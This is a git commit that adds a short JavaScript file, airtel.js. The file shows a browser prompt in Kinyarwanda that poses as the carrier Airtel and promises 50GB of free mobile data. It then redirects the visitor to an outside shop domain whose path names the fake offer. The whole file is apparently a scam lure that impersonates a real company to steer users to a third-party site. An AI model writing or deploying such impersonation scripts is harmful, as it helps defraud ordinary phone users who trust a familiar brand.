7a0840cbbcb8c724c06946660ddec905498179c7
bigetijazz6 <bigetijazz6@gmail.com>
2024-11-19 21:53:43 -0800

    Create airtel.js

---
+++ airtel.js
@@ -0,0 +1,5 @@
+var password = 'KORA 50GB'
+password=prompt('Airtel: Tuyishimire, Numero yawe igendanwa Yemerewe kwakira 50GB yubusa Data Airtel YASAZA SIM YABAHA, kanda neza Ok kugirango ukomeze nonaha','KORA 50GB');
+if (password != 'KORA 50GB') {
+location.href='https://www.offre-beta.shop/airtel50gbfree';
+}
